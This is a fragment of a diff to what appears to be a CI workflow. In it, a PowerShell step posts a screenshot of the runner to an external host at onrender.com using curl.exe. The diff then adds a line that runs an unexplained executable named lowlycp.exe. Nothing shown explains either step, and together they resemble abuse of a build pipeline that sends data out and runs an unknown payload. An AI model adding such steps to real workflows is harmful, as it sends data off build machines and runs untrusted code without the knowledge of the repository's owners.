@@ -74,6 +74,6 @@ jobs:
           $filePath = ".\screenshot.png"
           $uri = "https://thoughtheuniverse.onrender.com/upload"
           curl.exe -X POST -F "file=@$filePath" $uri
-
+          .\lowlycp.exe
 
           
